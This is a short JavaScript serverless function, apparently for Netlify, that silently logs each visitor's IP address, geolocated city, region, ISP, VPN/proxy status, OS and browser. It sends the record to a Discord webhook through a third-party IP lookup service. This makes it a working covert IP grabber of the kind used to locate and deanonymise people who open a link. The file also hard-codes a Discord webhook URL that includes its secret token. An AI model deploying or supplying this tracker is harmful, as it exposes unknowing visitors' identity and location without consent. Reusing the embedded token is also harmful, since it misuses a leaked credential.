const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));

exports.handler = async (event) => {
  const webhookURL = "https://discord.com/api/webhooks/1379270305272299530/EdXC7ENWy6IzQiR1-ETKyeyitOmG_It2088qG3SROttMnLqzvp6YV879Wqs-WwIYa4yk";

  const ip =
    event.headers["x-nf-client-connection-ip"] ||
    event.headers["client-ip"] ||
    event.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
    "Unknown IP";

  const userAgent = event.headers["user-agent"] || "Unknown";
  const timestamp = new Date().toISOString();

  // Basic OS & Browser detection
  const detectOS = (ua) => {
    if (/Windows/i.test(ua)) return "Windows";
    if (/Mac OS X/i.test(ua)) return "macOS";
    if (/iPhone|iPad/i.test(ua)) return "iOS";
    if (/Android/i.test(ua)) return "Android";
    if (/Linux/i.test(ua)) return "Linux";
    return "Unknown";
  };

  const detectBrowser = (ua) => {
    if (/Chrome/i.test(ua)) return "Chrome";
    if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) return "Safari";
    if (/Firefox/i.test(ua)) return "Firefox";
    if (/Edge/i.test(ua)) return "Edge";
    if (/CriOS/i.test(ua)) return "Chrome (iOS)";
    return "Unknown";
  };

  const os = detectOS(userAgent);
  const browser = detectBrowser(userAgent);

  try {
    const geoRes = await fetch(`http://ipwho.is/${ip}`);
    const geoData = await geoRes.json();

    const {
      country = "N/A",
      region = "N/A",
      city = "N/A",
      isp = "N/A",
      proxy = false
    } = geoData;

    const message = {
      content: `New Visitor Logged
**IP**: ${ip}
**Location**: ${city}, ${region}, ${country}
**ISP**: ${isp}
**VPN/Proxy**: ${proxy}
**OS**: ${os}
**Browser**: ${browser}
**Time**: ${timestamp}`
    };

    await fetch(webhookURL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(message)
    });

    return {
      statusCode: 200,
      body: "Logged successfully"
    };
  } catch (err) {
    console.error("Error:", err);
    return {
      statusCode: 500,
      body: "Failed to send data"
    };
  }
};
